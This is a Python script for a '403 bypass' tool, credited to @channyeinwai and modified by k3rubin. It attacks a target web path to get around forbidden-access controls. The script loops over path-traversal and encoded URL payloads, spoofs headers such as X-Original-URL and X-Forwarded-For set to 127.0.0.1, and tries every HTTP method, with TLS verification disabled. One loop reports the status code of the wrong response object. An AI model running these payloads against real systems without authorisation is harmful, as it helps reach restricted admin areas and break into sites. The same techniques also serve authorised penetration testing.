import requests
import warnings
import argparse
from modules.utilities.request_outputs import url_fuzzer_output, http_method_fuzzer_output



print("""\u001b[36m
                                                  
 ___ ___ ___    _____                             
| | |   |_  |  | __  |_ _ ___ ___ ___ ___ ___ ___ 
|_  | | |_  |  | __ -| | | . | .'|_ -|_ -| -_|  _|
  |_|___|___|  |_____|_  |  _|__,|___|___|___|_|  
                     |___|_|        \u001b[0m                  
						
			\033[1;33;36m originally written by @channyeinwai.
				modded by k3rubin \m/ \033[1;33;0m
	""")
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

parser = argparse.ArgumentParser(description="403 Bypasser : python 403-bypass.py -u https://www.example.com -p /admin -x .pdf")
parser.add_argument('-u', '--url' , help = 'Provide url ' , required=True)
parser.add_argument('-p' , '--path' , help = 'Provide the path (ex. /admin)' , required=True)
parser.add_argument('-x' , '--extension' , help = 'Provide extra payload/extension [optional]' , required=False)
args = parser.parse_args()

url = args.url.rstrip('/')
path = args.path
extension = args.extension

payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","%2500","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23"]

full_url = url+'/'+path
slash_path = '/'+path

print("Target URL: ", url)

# TODO - Implement code reuse
print("\n", "Fuzzing via URL....", "\n")
for payload in payloads:
	try:
		full_url2 = url+slash_path+payload
		req = requests.get(full_url2, allow_redirects=False , verify = False , timeout = 5)
		url_fuzzer_output(full_url2, str(req.status_code))

	except Exception:
		pass

for payload in payloads:
	try:
		full_url3 = url+payload+path
		r = requests.get(full_url3 , allow_redirects=False , verify = False , timeout = 5)
		url_fuzzer_output(full_url3, str(req.status_code))

	except Exception:
		pass

for payload in payloads:
	try:
		full_url4 = url+slash_path+payload+extension
		req = requests.get(full_url4 , allow_redirects=False , verify = False , timeout = 5)
		url_fuzzer_output(full_url4, str(req.status_code))

	except Exception:
		pass

# TODO - Implement code reuse, put header payloads to a list then iterate them in a loop
print("\n", "Fuzzing via HTTP Headers....", "\n")
r1 = requests.get(full_url, headers={"X-Original-URL":path} , allow_redirects=False , verify=False , timeout=5)
if ((str(r1.status_code)) != '404'):
	print(full_url + ' : ' +"(X-Original-URL: "+ path + ')' + ' : ' + str(r1.status_code))

r2 = requests.get(full_url, headers={"X-Custom-IP-Authorization" : "127.0.0.1"} , allow_redirects=False , verify=False , timeout=5)
if ((str(r2.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Custom-IP-Authorization: 127.0.0.1" + ')'+ ' : ' + str(r2.status_code))

r3 = requests.get(full_url, headers={"X-Forwarded-For": "http://127.0.0.1"} , allow_redirects=False , verify=False , timeout=5)
if ((str(r3.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Forwarded-For: http://127.0.0.1" + ')'+ ' : ' + str(r3.status_code))

r4 = requests.get(full_url, headers={"X-Forwarded-For": "127.0.0.1:80"} , allow_redirects=False , verify=False , timeout=5)
if ((str(r4.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Forwarded-For: 127.0.0.1:80" + ')'+ ' : ' + str(r4.status_code))

r5 = requests.get(url, headers={"X-rewrite-url": slash_path} , allow_redirects=False , verify=False , timeout=5)
if ((str(r5.status_code)) != '404'):
	print(full_url + ' : ' + "(X-rewrite-url: {}".format(slash_path) + ')'+ ' : ' + str(r5.status_code))

r6 = requests.get(full_url, headers={'X-Forwarded-Host':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
if ((str(r6.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Forwarded-Host:127.0.0.1" + ')'+ ' : ' + str(r6.status_code))

r7 = requests.get(full_url, headers={'X-Host':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
if ((str(r7.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Host:127.0.0.1" + ')'+ ' : ' + str(r7.status_code))

r8 = requests.get(full_url, headers={'X-Remote-IP':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
if ((str(r8.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Remote-IP:127.0.0.1" + ')'+ ' : ' + str(r8.status_code))

r9 = requests.get(full_url, headers={'X-Originating-IP':'127.0.0.1'} , allow_redirects=False , verify=False , timeout=5)
if ((str(r9.status_code)) != '404'):
	print(full_url + ' : ' + "(X-Originating-IP:127.0.0.1" + ')'+ ' : ' + str(r9.status_code))


print("\n", "Fuzzing via HTTP Methods....", "\n")
with open('./modules/payloads/http_methods.txt') as methods:
	for method in methods:
		method = method.strip('\n')
		request = requests.request("{}".format(method), full_url, allow_redirects=False, verify=False, timeout= 5)
		http_method_fuzzer_output(full_url, str(request.status_code), method)
